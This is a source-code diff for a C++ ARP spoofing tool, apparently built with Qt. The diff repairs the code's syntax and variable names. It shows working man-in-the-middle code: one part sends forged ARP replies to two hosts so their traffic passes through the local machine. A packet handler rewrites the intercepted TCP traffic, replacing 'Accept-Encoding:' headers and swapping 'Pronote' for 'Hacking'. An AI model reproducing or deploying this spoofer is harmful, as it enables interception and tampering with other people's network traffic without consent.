@@ -25,7 +25,7 @@ void    ArpSpoofer::Initialize()
     setsockopt(_socket_arp, IPPROTO_IP, IP_HDRINCL, (char *) val, sizeof(one));
 }
 
-void     ArpSpoofer::Start(const std::string &local_ip, char *local_mac, const std::string &ip1, char *mac1, const std::string &ip2, char *mac2)
+void     ArpSpoofer::Start(const std::string &interface, const std::string &local_ip, char *local_mac, const std::string &ip1, char *mac1, const std::string &ip2, char *mac2)
 {
     _local_mac = local_mac;
     _local_ip = local_ip;
@@ -66,7 +66,7 @@ void     ArpSpoofer::ManageNewPacket(SniffedPacket &packet)
     //nb_bytes_added += replaceTCPText(packet, "img src=", "img src=\"http://upload.wikimedia.org/wikipedia/fr/f/fb/C-dans-l'air.png\" "); // 65
     nb_bytes_added += ReplaceTCPText(packet, "Accept-Encoding:", "Accept-Rubbish!:");
     nb_bytes_added += ReplaceTCPText(packet, "Pronote", "Hacking");
-    qDebug("Replaced %d bytes", nb_bytes_added;
+    qDebug("Replaced %d bytes", nb_bytes_added);
 
     IP_HDR  *ip_hdr = (IP_HDR *) (packet.data + ETHER_HDR_SIZE);
     struct sockaddr_in   sin;
@@ -81,7 +81,7 @@ void     ArpSpoofer::ManageNewPacket(SniffedPacket &packet)
 void     ArpSpoofer::SendArpRedirectRequest()
 {
 #ifdef __linux__
-    if (client1 == NULL || client2 == NULL || !this->sniffer->IsSniffing())
+    if (_client1 == NULL || _client2 == NULL )
         return;
 
     int                 sock;
@@ -94,18 +94,18 @@ void     ArpSpoofer::SendArpRedirectRequest()
     if (sock < 0)
         qDebug() << "fail socket";
 
-    client_t    *client = client1;
+    client_t    *client = _client1;
     for (int i = 0; i < 2; ++i)
     {
         // To
-        sscanf((client == client1 ? client2->ip : client1->ip).c_str(), "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
+        sscanf((client == _client1 ? _client2->ip : _client1->ip).c_str(), "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
                                        (int *) &arp->arp_spa[1],
                                        (int *) &arp->arp_spa[2],
                                        (int *) &arp->arp_spa[3]);
         // From
         std::memcpy(arp->arp_tha, client->mac, 6);
         // By
-        std::memcpy(arp->arp_sha, _mac, 6);
+        std::memcpy(arp->arp_sha, _local_mac, 6);
 
         memcpy(eth->ether_dhost, arp->arp_tha, ETH_ALEN);
         memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
@@ -118,13 +118,13 @@ void     ArpSpoofer::SendArpRedirectRequest()
         arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
 
         memset(&device, 0, sizeof(device));
-        device.sll_ifindex = if_nametoindex(this->interface.c_str());
+        device.sll_ifindex = if_nametoindex(_interface.c_str());
         device.sll_family = AF_PACKET;
         memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN);
         device.sll_halen = htons(ETH_ALEN);
 
         sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device));
-        client = client2;
+        client = _client2;
     }
 
     ::close(sock);
